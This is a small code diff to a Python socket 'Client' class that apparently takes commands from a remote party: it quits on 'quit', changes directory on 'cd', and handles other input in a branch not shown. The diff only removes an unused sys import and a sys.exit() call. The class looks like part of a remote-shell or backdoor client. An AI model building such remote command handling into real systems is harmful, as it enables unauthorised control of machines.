@@ -3,7 +3,6 @@ import requests
 import socket
 import json
 import uuid
-import sys
 import re
 import os
 
@@ -70,7 +69,6 @@ class Client(object):
                     if data == 'quit':
                         print("quitting...")
                         self.client.close()
-                        sys.exit()
                     elif data[:2] == 'cd':
                         os.chdir(data[3:])
                     elif len(data) > 0:
